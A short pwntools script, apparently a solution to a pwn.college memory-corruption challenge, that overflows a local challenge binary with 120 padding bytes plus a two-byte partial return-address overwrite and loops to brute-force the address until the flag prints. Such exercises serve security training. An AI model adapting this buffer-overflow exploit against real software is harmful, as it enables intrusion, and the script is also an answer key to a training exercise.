from pwn import *

elf = ELF("/challenge/babymem-level-7-0")


p = elf.process()
p.sendline(b"512")
address = b"\x62\x6b"
payload = b"A"*120+address

while True:
    p = elf.process()
    p.sendline(f'{len(payload)}'.encode())
    p.sendline(payload)
    p.recvuntil(b"Goodbye!")
    flag = p.recvall().decode()
    if 'pwn.college' in flag:
        print(flag)
        break
    
